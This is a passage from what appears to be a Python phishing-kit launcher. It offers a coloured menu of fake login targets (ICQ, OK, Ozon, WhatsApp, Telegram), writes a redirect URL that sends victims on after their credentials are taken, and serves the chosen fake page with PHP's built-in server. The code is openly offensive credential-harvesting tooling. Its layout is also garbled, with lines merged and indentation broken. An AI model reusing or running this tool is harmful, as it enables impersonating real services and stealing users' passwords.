...
\033[33m.::|Other|::.\033[0m                                                \033[32m[*]\033[35m[13] - Password in head """+no+"""
\033[0m""")
attack = input("\033[32m|-[>>>]:\033[0m ")
if attack == "1":
    attack = "icq"
elif attack == "2":                                                             attack = "ok"                                                           elif attack == "3":
    attack = "ozon"
elif attack == "4":
    attack = "what"
elif attack == "5":                                                             attack = "teleg"
elif attack == "6":
    print("""\033[35m
...
print("\033[33m")                                                           if loca == "":
    if lang == "2":                                                                 f = open("www/ru/"+str(attack)+"/location.u", 'w')
        f.write("https://google.com")                                               f.close()
    else:
        f = open("www/en/"+str(attack)+"/location.u", 'w')
        f.write("https://google.com")                                               f.close()
else:                                                                           if lang == "2":
        f = open("www/ru/"+str(attack)+"/location.u", 'w')                          f.write(loca)
        f.close()                                                               else:
        f = open("www/en/"+str(attack)+"/location.u", 'w')                          f.write(loca)
        f.close()
if ports == "":
    ports=8080

if lang == "2":                                                                 os.system("cd www/ru/"+str(attack)+" && php -S localhost:"+str(ports))  else:
